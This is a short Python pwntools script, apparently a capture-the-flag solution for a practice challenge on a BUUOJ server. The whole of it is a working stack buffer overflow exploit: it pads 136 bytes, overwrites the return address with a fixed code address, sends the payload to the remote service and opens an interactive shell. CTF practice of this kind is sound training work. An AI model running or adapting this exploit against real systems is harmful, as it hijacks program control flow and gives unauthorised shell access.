from pwn import * 
from pwn import p64
import socket

pwnaddr=0x40060D


payload = b'I'*128+b'A'*8+p64(0x0400596)
host = 'node4.buuoj.cn'
ip = socket.gethostbyname(host)
r = remote(ip,26356)#远程连接

# r=process('./pwn/pwn1')


print (r.recv())
r.sendline(payload)#发送一行数据
# print (r.recv())

r.interactive()#交互shell